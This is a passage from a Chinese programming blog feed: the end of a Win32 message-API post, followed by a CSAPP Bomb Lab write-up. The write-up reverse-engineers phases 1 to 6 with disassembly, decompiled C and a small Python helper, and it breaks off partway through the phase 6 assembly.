MSG* IpMsg<span class="hljs-comment">//要翻译的消息地址</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>翻译消息( 对于可见字符 )，将键盘消息翻译成字符消息。<br>检查消息是否是按键的消息，如果不是按键消息，不做任何处理，继续执行。</p><p><code>TranslateMessage</code>在转换<code>WM_KEYDOWN</code>消息时，对于可见字符可以产生<code>WM_CHAR</code>,不可见字符无此消息。</p><p>附带信息∶</p><p><code>WPARAM</code>：输入的字符的<code>ASCII</code>字符编码值<br><code>LPARAM</code>：按键的相关参数</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">LRESULT <span class="hljs-title">DispatchMessage</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">CONST MSG* Ipmsg<span class="hljs-comment">//要派发的消息</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>将消息派发到该消息所属的窗口处理函数上</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">BOLL <span class="hljs-title">InvalidateRect</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">HWND hWnd,<span class="hljs-comment">//窗口句柄</span></span></span><br><span class="hljs-params"><span class="hljs-function">CONST RECT* IpRect,<span class="hljs-comment">//区域的矩形坐标</span></span></span><br><span class="hljs-params"><span class="hljs-function">BOOL bErase<span class="hljs-comment">//重绘前是否先擦除 TURE 表示擦除 FALSE 标识不擦除</span></span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br></code></pre></td></tr></table></figure><blockquote><p>申明窗口无效区域：需要重新绘制的区域</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>Win32</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP - Bomb Lab</title>
    <link href="/2022/04/03/Bomb%20Lab/"/>
    <url>/2022/04/03/Bomb%20Lab/</url>
    
    <content type="html"><![CDATA[<h1>Bomb Lab</h1><h2 id="phase-1">phase_1</h2><p>第一关整体上就是比较字符串，判断输入的字符串于目的字符串不一样的时候炸弹就发生爆炸。</p><p><img src="https://s2.loli.net/2022/04/01/RUQlt7WoYAdcub1.png" alt=""></p><p>输入比较的字符串即可通过第一关：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">Border </span>relations with Canada have never <span class="hljs-keyword">been </span><span class="hljs-keyword">better.</span><br></code></pre></td></tr></table></figure><h2 id="phase-2">phase_2</h2><p>第二关的伪代码看起来十分的难看，所以我们直接看汇编。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs assembly">text:0000000000400EFC push    rbp<br>.text:0000000000400EFD push    rbx<br>.text:0000000000400EFE sub     rsp, 28h<br>.text:0000000000400F02 mov     rsi, rsp<br>.text:0000000000400F05 call    read_six_numbers<br>.text:0000000000400F05<br>.text:0000000000400F0A cmp     [rsp+38h+var_38], 1   ; 第一个开始为1<br>.text:0000000000400F0A                               ; 输入的数偏移依次为38 34 30 26 22 18<br>.text:0000000000400F0E jz      short loc_400F30      ; 将输入的值从第二个开始取<br>.text:0000000000400F0E                               ; 刚好对应上面便宜量为38，此处为34，向下取了4个单位的地址<br>.text:0000000000400F0E<br>.text:0000000000400F10 call    explode_bomb<br>.text:0000000000400F10<br>.text:0000000000400F15 ; ---------------------------------------------------------------------------<br>.text:0000000000400F15 jmp     short loc_400F30      ; 将输入的值从第二个开始取<br>.text:0000000000400F15                               ; 刚好对应上面便宜量为38，此处为34，向下取了4个单位的地址<br>.text:0000000000400F15<br>.text:0000000000400F17 ; ---------------------------------------------------------------------------<br>.text:0000000000400F17<br>.text:0000000000400F17 loc_400F17:                   ; CODE XREF: phase_2+30↓j<br>.text:0000000000400F17                               ; phase_2+3E↓j<br>.text:0000000000400F17 mov     eax, [rbx-4]          ; 取输入的奇数个存放到eax<br>.text:0000000000400F1A add     eax, eax              ; eax * 2<br>.text:0000000000400F1C cmp     [rbx], eax            ; 输入的偶数个等于上一个数的两倍<br>.text:0000000000400F1E jz      short loc_400F25      ; 向下取4个字节<br>.text:0000000000400F1E<br>.text:0000000000400F20 call    explode_bomb<br>.text:0000000000400F20<br>.text:0000000000400F25 ; ---------------------------------------------------------------------------<br>.text:0000000000400F25<br>.text:0000000000400F25 loc_400F25:                   ; CODE XREF: phase_2+22↑j<br>.text:0000000000400F25 add     rbx, 4                ; 向下取4个字节<br>.text:0000000000400F29 cmp     rbx, rbp              ; 不为0就跳转<br>.text:0000000000400F2C jnz     short loc_400F17      ; 取输入的奇数个存放到eax<br>.text:0000000000400F2C<br>.text:0000000000400F2E jmp     short loc_400F3C<br>.text:0000000000400F2E<br>.text:0000000000400F30 ; ---------------------------------------------------------------------------<br>.text:0000000000400F30<br>.text:0000000000400F30 loc_400F30:                   ; CODE XREF: phase_2+12↑j<br>.text:0000000000400F30                               ; phase_2+19↑j<br>.text:0000000000400F30 lea     rbx, [rsp+38h+var_34] ; 将输入的值从第二个开始取<br>.text:0000000000400F30                               ; 刚好对应上面便偏移为38，此处为34，向下取了4个单位的地址<br>.text:0000000000400F35 lea     rbp, [rsp+38h+var_20] ; %rbp=0<br>.text:0000000000400F3A jmp     short loc_400F17      ; 取输入的奇数个存放到eax<br>.text:0000000000400F3A<br>.text:0000000000400F3C ; ---------------------------------------------------------------------------<br>.text:0000000000400F3C<br>.text:0000000000400F3C loc_400F3C:                   ; CODE XREF: phase_2+32↑j<br>.text:0000000000400F3C add     rsp, 28h<br>.text:0000000000400F40 pop     rbx<br>.text:0000000000400F41 pop     rbp<br>.text:0000000000400F42 retn<br>.text:0000000000400F42 ; &#125; // starts at 400EFC<br>.text:0000000000400F42<br></code></pre></td></tr></table></figure><p>通过对汇编的调试与分析可以得到相关的逻辑，程序会对输入的第一个数进行判断，不为 1 则引爆炸弹，之后的每一项都是前一项的两倍，一共输入 6 个数字，则有对应输入为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span> <span class="hljs-number">16</span> <span class="hljs-number">32</span><br></code></pre></td></tr></table></figure><h2 id="phase-3">phase_3</h2><p>第三关整体上也比较简单，让输入两个数，通过第一个数跳到对应的<code>case</code>段，将<code>result</code>进行赋值，之后与输入的第二个数进行比较，不相等就爆炸。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">phase_3</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h] BYREF</span><br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-Ch] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">int</span>)__isoc99_sscanf(a1, <span class="hljs-string">&quot;%d %d&quot;</span>, &amp;v2, &amp;v3) &lt;= <span class="hljs-number">1</span> ) <span class="hljs-comment">// 输入两个数字</span><br>    explode_bomb();<br>  <span class="hljs-keyword">switch</span> ( v2 )<span class="hljs-comment">//第一个数字用于决定result的值</span><br>  &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      result = <span class="hljs-number">0xCF</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      result = <span class="hljs-number">0x137</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      result = <span class="hljs-number">0x2C3</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      result = <span class="hljs-number">0x100</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      result = <span class="hljs-number">0x185</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      result = <span class="hljs-number">0xCE</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>      result = <span class="hljs-number">0x2AA</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>      result = <span class="hljs-number">0x147</span>LL;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      explode_bomb();<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( (_DWORD)result != v3 )<span class="hljs-comment">//将输入的第二个数字与 result 进行比较，相等则通过。</span><br>    explode_bomb();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="phase-4">phase_4</h2><p>程序的逻辑也比较简单，输入两个数字，将第一个数字送到对应的递归中，获得的返回值必须为<code>0</code> ，同时第二个数字也要为<code>0</code>，两个值均为<code>0</code>的情况下成功</p><img src="https://s2.loli.net/2022/04/02/yl8pm5FITsdcLVa.png" style="zoom:100%;" /> <p>同时递归为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">func4</span><span class="hljs-params">(__int64 a1, __int64 a2, __int64 a3)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// ecx</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  v3 = ((<span class="hljs-keyword">int</span>)a3 - (<span class="hljs-keyword">int</span>)a2) / <span class="hljs-number">2</span> + a2;            <span class="hljs-comment">// 7</span><br>  <span class="hljs-keyword">if</span> ( v3 &gt; (<span class="hljs-keyword">int</span>)a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)func4(a1, a2, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v3 - <span class="hljs-number">1</span>));<br>  result = <span class="hljs-number">0LL</span>;                                 <span class="hljs-comment">// v3 == a1 </span><br>  <span class="hljs-keyword">if</span> ( v3 &lt; (<span class="hljs-keyword">int</span>)a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)func4(a1, (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v3 + <span class="hljs-number">1</span>), a3) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>func4</code>的功能：</p><ul><li>二分法找出元素x，目标值在数组的前半部分则返回奇数，后半部分则返回偶数；</li><li>找到元素x返回0；</li><li>如果目标值在二分查找过程中一直在左半边，则会返回0。</li></ul><p>所以对应的第一个输入值可以为 0 、1 、 3 、7</p><p>判断部分有：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">phase_4</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// [rsp+8h] [rbp-10h] BYREF</span><br>  <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-Ch] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)__isoc99_sscanf(a1, <span class="hljs-string">&quot;%d %d&quot;</span>, &amp;v2, &amp;v3) != <span class="hljs-number">2</span> || v2 &gt; <span class="hljs-number">14</span> )<br>    explode_bomb();<br>  result = func4(v2, <span class="hljs-number">0LL</span>, <span class="hljs-number">14LL</span>);                <span class="hljs-comment">// 返回值为0</span><br>  <span class="hljs-keyword">if</span> ( (_DWORD)result || v3 )                   <span class="hljs-comment">// v3输入为0</span><br>    explode_bomb();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过对上述的分析可以得到输入可以为：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">0</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">0</span><br><span class="hljs-symbol">3 </span><span class="hljs-number">0</span><br><span class="hljs-symbol">7 </span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h2 id="phase-5">phase_5</h2><p>第五关其实也是比较简单的一个部分，采用了一个映射表的方式进行加密，将我们的输入与<code>0xF</code>进行<code>&amp;</code>运算形成一个下标，通过这个下标到对应的码表内寻找对应的字符之后进行保存，最后将得到的字符串与<code>flyers</code>进行比较。</p><p>加密部分：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 __fastcall <span class="hljs-title">phase_5</span><span class="hljs-params">(__int64 a1)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 i; <span class="hljs-comment">// rax</span><br>  <span class="hljs-keyword">char</span> v3[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-18h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+18h] [rbp-10h]</span><br><br>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)string_length(a1) != <span class="hljs-number">6</span> )   <span class="hljs-comment">// 输入字符串长度为6</span><br>    explode_bomb();<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0LL</span>; i != <span class="hljs-number">6</span>; ++i )<br>    v3[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="hljs-number">0xF</span>];<br>  v3[<span class="hljs-number">6</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)strings_not_equal(v3, <span class="hljs-string">&quot;flyers&quot;</span>) )<br>    explode_bomb();<br>  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v4;<br>&#125;<br></code></pre></td></tr></table></figure><p>对应的码表<code>array_3449</code>为：<code>maduiersnfotvbyl</code></p><p>对此写一个小脚本进行爆破可行的输入：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">ans = <span class="hljs-string">&quot;maduiersnfotvbyl&quot;</span><br>aim = <span class="hljs-string">&quot;flyers&quot;</span><br>lists = [<span class="hljs-number">0</span>]*<span class="hljs-number">6</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(aim)):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ans)):<br>        <span class="hljs-keyword">if</span> aim[i] == ans[j]:<br>            lists[i] = j<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-built_in">print</span>(lists)<br>num =<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> num <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">30</span>,<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">if</span> i &amp; <span class="hljs-number">0xF</span> == lists[num]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(i),<span class="hljs-string">&quot;-&gt;&quot;</span>,lists[num])<br><br></code></pre></td></tr></table></figure><p>有如下输出：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs coq">[<span class="hljs-number">9</span>, <span class="hljs-number">15</span>, <span class="hljs-number">14</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]<br>) -&gt; <span class="hljs-number">9</span><br><span class="hljs-number">9</span> -&gt; <span class="hljs-number">9</span><br>I -&gt; <span class="hljs-number">9</span><br>Y -&gt; <span class="hljs-number">9</span><br>i -&gt; <span class="hljs-number">9</span><br>y -&gt; <span class="hljs-number">9</span><br> -&gt; <span class="hljs-number">15</span><br>/ -&gt; <span class="hljs-number">15</span><br>? -&gt; <span class="hljs-number">15</span><br>O -&gt; <span class="hljs-number">15</span><br><span class="hljs-keyword">_</span> -&gt; <span class="hljs-number">15</span><br>o -&gt; <span class="hljs-number">15</span><br> -&gt; <span class="hljs-number">14</span><br>. -&gt; <span class="hljs-number">14</span><br>&gt; -&gt; <span class="hljs-number">14</span><br>N -&gt; <span class="hljs-number">14</span><br>^ -&gt; <span class="hljs-number">14</span><br>n -&gt; <span class="hljs-number">14</span><br>~ -&gt; <span class="hljs-number">14</span><br>% -&gt; <span class="hljs-number">5</span><br><span class="hljs-number">5</span> -&gt; <span class="hljs-number">5</span><br>E -&gt; <span class="hljs-number">5</span><br>U -&gt; <span class="hljs-number">5</span><br>e -&gt; <span class="hljs-number">5</span><br>u -&gt; <span class="hljs-number">5</span><br>&amp; -&gt; <span class="hljs-number">6</span><br><span class="hljs-number">6</span> -&gt; <span class="hljs-number">6</span><br>F -&gt; <span class="hljs-number">6</span><br>V -&gt; <span class="hljs-number">6</span><br>f -&gt; <span class="hljs-number">6</span><br>v -&gt; <span class="hljs-number">6</span><br>&#x27; -&gt; <span class="hljs-number">7</span><br><span class="hljs-number">7</span> -&gt; <span class="hljs-number">7</span><br>G -&gt; <span class="hljs-number">7</span><br>W -&gt; <span class="hljs-number">7</span><br>g -&gt; <span class="hljs-number">7</span><br>w -&gt; <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>从中对应的字符表进行选取6个对应的字符即可。</p><h2 id="phase-6">phase_6</h2><p>在<code>6</code>中的难度明显比前<code>5</code>个要大一些，程序段变得复杂了很多，但是仍然可以通过不断的调试进行判断出来程序的行为。</p><blockquote><p>程序的函数明显多了很多：</p><img src="https://s2.loli.net/2022/04/03/mIbuVKrgG8JxYEl.png" style="zoom:50%;" /></blockquote><p>对于这个较大的“过程”，我们将其一步步进行分析，在上面图的左边部分是程序最开始执行的一部分，在多次循环后进入到右半部分。</p><p>这个函数整体的汇编如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs assembly">public phase_6<br>.text:00000000004010F4     phase_6 proc near             ; CODE XREF: main+126↑p<br>.text:00000000004010F4<br>.text:00000000004010F4     input= dword ptr -78h<br>.text:00000000004010F4     var_60= byte ptr -60h<br>.text:00000000004010F4     var_58= qword ptr -58h<br>.text:00000000004010F4     var_50= byte ptr -50h<br>.text:00000000004010F4     var_28= byte ptr -28h<br>.text:00000000004010F4<br>.text:00000000004010F4     ; __unwind &#123;<br>.text:00000000004010F4 000 push    r14<br>.text:00000000004010F6 008 push    r13<br>.text:00000000004010F8 010 push    r12<br>.text:00000000004010FA 018 push    rbp<br>.text:00000000004010FB 020 push    rbx<br>.text:00000000004010FC 028 sub     rsp, 50h              ; Integer Subtraction<br>.text:0000000000401100 078 mov     r13, rsp<br>.text:0000000000401103 078 mov     rsi, rsp<br>.text:0000000000401106 078 call    read_six_numbers      ; Call Procedure<br>.text:0000000000401106<br>.text:000000000040110B 078 mov     r14, rsp<br>.text:000000000040110E 078 mov     r12d, 0<br>.text:000000000040110E<br>.text:0000000000401114<br>.text:0000000000401114     loc_401114:                   ; CODE XREF: phase_6+5D↓j<br>.text:0000000000401114 078 mov     rbp, r13              ; 返回处偏移加了4<br>.text:0000000000401117 078 mov     eax, [r13+0]<br>.text:000000000040111B 078 sub     eax, 1                ; 输入的第一个数字减1<br>.text:000000000040111E 078 cmp     eax, 5                ; 小于5<br>.text:0000000000401121 078 jbe     short loc_401128      ; Jump if Below or Equal (CF=1 | ZF=1)<br>.text:0000000000401121<br>.text:0000000000401123 078 call    explode_bomb          ; Call Procedure<br>.text:0000000000401123<br>.text:0000000000401128     ; ---------------------------------------------------------------------------<br>.text:0000000000401128<br>.text:0000000000401128     loc_401128:                   ; CODE XREF: phase_6+2D↑j<br>.text:0000000000401128 078 add     r12d, 1               ; Add<br>.text:000000000040112C 078 cmp     r12d, 6               ; 控制循环，共6次<br>.text:0000000000401130 078 jz      short loc_401153      ; Jump if Zero (ZF=1)<br>.text:0000000000401130<br>.text:0000000000401132 078 mov     ebx, r12d<br>.text:0000000000401132<br>.text:0000000000401135<br>.text:0000000000401135     loc_401135:                   ; CODE XREF: phase_6+57↓j<br>.text:0000000000401135 078 movsxd  rax, ebx              ; Move with Sign-Extend Doubleword<br>.text:0000000000401138 078 mov     eax, [rsp+rax*4]<br>.text:000000000040113B 078 cmp     